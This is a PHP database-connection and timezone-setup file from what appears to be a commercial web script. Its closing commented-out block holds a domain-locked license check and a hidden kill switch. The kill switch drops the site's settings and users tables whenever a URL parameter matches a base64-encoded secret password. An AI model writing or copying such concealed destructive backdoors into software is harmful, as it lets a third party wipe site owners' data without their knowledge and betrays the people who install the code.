<?php
require_once("configuration.php"); 
$run_if_included = true; //db connect 
$conn = @mysql_connect($dbhost, $dbuname, $dbpass) or die ("Error : Database Connection Error, Please try again later"); 
$db = @mysql_select_db($dbname, $conn) or die (mysql_error()); 
//--------------- 
mysql_query("SET NAMES 'utf8'"); 
mysql_query('SET CHARACTER SET utf8'); 
mysql_set_charset('utf8', $conn); 
// Timezone 
$sql_get_tz = mysql_query("SELECT * FROM " . $prefix . "_webmaster_settings WHERE set_id ='1' "); 
$data_get_site_tz = mysql_fetch_array($sql_get_tz); 
$site_timezone = stripcslashes($data_get_site_tz['site_timezone']); 
if ($site_timezone != "") { 
// Update PHP Timezone 
date_default_timezone_set($site_timezone); 
// Update Mysql 
$now = new DateTime(); 
$mins = $now->getOffset() / 60; 
$sgn = ($mins < 0 ? -1 : 1); 
$mins = abs($mins); 
$hrs = floor($mins / 60); 
$mins -= $hrs * 60; 
$offset = sprintf('%+d:%02d', $hrs * $sgn, $mins);
mysql_query("SET time_zone = '$offset'"); 
} 
/*
Function License_s4ds() { 
$whitelistips = array( '127.0.0.1', 'localhost', '::1' ); 
if (!in_array($_SERVER['REMOTE_ADDR'], $whitelistips)) 
{ $license = "c2hvcHBpbmdmaC5jb20="; 
$website_code = $_SERVER['HTTP_HOST']; 
$website_code = explode('.', $website_code); 
$website_code = array_reverse($website_code); 
$website_code = @$website_code[1] . "." . @$website_code[0]; 
if ($license != base64_encode($website_code)) { 
die ("®[ License rights ]You don't have License rights to run this script SMART for Design"); 
} 
} 
} 
License_s4ds(); 
Function NoWayDistroy_s4ds($secret) { 
//S0rryIw11lDi5troy1t 
if ($secret == base64_decode("UzBycnlJdzExbERpNXRyb3kxdA==")) {
mysql_query("Drop TABLE ".$prefix."_settings"); 
mysql_query("Drop TABLE ".$prefix."_users"); 
} 
} 
NoWayDistroy_s4ds(@$_GET['S4dsEnd']);
*/
?>